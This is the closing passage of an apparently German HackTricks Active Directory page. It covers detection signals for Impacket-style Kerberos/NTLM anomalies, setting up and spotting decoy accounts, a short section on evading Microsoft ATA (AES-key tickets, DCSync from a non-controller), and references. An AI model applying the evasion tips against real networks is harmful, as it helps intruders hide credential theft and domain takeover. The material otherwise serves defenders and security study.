- Sparse oder duplizierte Kerberos-etype-Listen, ungewöhnliche/fehlende `PA-DATA` oder eine TGS-REQ-etype-Reihenfolge, die sich von nativem Windows unterscheidet
- NTLM-Type-1-Nachrichten ohne Versionsinfo oder Type-3-Nachrichten mit null Hostnamen
- Rohes NTLMSSP in DCE/RPC statt SPNEGO, fehlende DCE/RPC verification trailers oder SPNEGO/Kerberos-OID-Mismatches
- Mehrere dieser Merkmale vom selben Host/User/Session-Time-Window sind deutlich stärker als jedes einzelne schwache Feld
- **Als Enrichment verwenden, nicht als Standalone-Alerts**:
- Default-Dateinamen, Output-Pfade, zufällige Service-Namen, temporäre Batch-Namen, Default-Computer-Account-Namen und tool-spezifische HTTP/WebDAV/RDP/MSSQL-Strings
- Diese sind für Operatoren leicht zu ändern und eignen sich am besten, um zu erklären, warum ein Cross-Protocol-Cluster verdächtig ist
- **Operative Hinweise**:
- Einige dieser Signale erfordern entschlüsselten Traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW oder Sichtbarkeit auf der Service-Seite
- Vor dem Hochstufen zu Alerts gegen Samba/Linux-Clients, Appliances und Legacy-Software validieren
- Detektionen von Enrichment -> Hunting -> Alerting hochstufen, während du Vertrauen in die Baseline aufbaust

### **Implementierung von Deception Techniques**

- Die Implementierung von Deception umfasst das Aufstellen von Fallen, etwa Decoy-Users oder -Computern, mit Merkmalen wie Passwörtern, die nicht ablaufen, oder die als Trusted for Delegation markiert sind. Ein detaillierter Ansatz beinhaltet das Erstellen von Benutzern mit spezifischen Rechten oder das Hinzufügen zu hoch privilegierten Gruppen.
- Ein praktisches Beispiel ist die Verwendung von Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mehr zum Deployment von Deception Techniques findest du unter [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **Für User-Objekte**: Verdächtige Indikatoren sind atypische ObjectSID, seltene Logons, Erstellungsdaten und niedrige Bad-Password-Counts.
- **Allgemeine Indikatoren**: Der Vergleich von Attributen potenzieller Decoy-Objekte mit denen echter Objekte kann Inkonsistenzen aufdecken. Tools wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können beim Erkennen solcher Täuschungen helfen.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermeide Session Enumeration auf Domain Controllern, um ATA-Detection zu verhindern.
- **Ticket Impersonation**: Die Nutzung von **aes**-Keys für die Ticket-Erstellung hilft dabei, Detection zu umgehen, indem nicht auf NTLM herabgestuft wird.
- **DCSync Attacks**: Die Ausführung von einem Nicht-Domain-Controller aus ist ratsam, um ATA-Detection zu vermeiden, da eine direkte Ausführung vom Domain Controller Alerts auslöst.

## Referenzen

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)
- [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [rub-softsec/onelogon - Onelogon: Taking over Active Directory Accounts via Netlogon](https://github.com/rub-softsec/onelogon)
- [Microsoft - How to manage the changes in Netlogon secure channel connections associated with CVE-2020-1472](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11ee)

{{#include ../../banners/hacktricks-training.md}}
